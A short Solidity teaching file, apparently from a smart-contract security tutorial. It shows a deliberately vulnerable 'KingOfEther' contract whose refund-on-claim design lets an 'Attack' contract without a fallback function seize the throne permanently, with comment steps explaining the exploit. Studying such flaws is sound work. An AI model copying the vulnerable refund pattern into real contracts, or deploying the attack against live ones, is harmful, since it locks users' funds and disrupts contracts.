pragma solidity ^0.5.16;
// Denial of Service (DoS)
// The goal of KingOfEther is to become the king by sending more Ether than the previous king.
// Previos king will receive the previous amount of Ether required to become the king.

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingOfEther {
    address public king;
    uint public balance;
    
    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");
        
        (bool sent, ) = king.call.value(balance)("");
        require(sent, "Failed to send Ether");
        
        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;
    
    constructor(KingOfEther _kingOfEther) public {
        kingOfEther = KingOfEther(_kingOfEther);
    }
    
    function attack() public payable {
        kingOfEther.claimThrone.value(msg.value)();
    }
}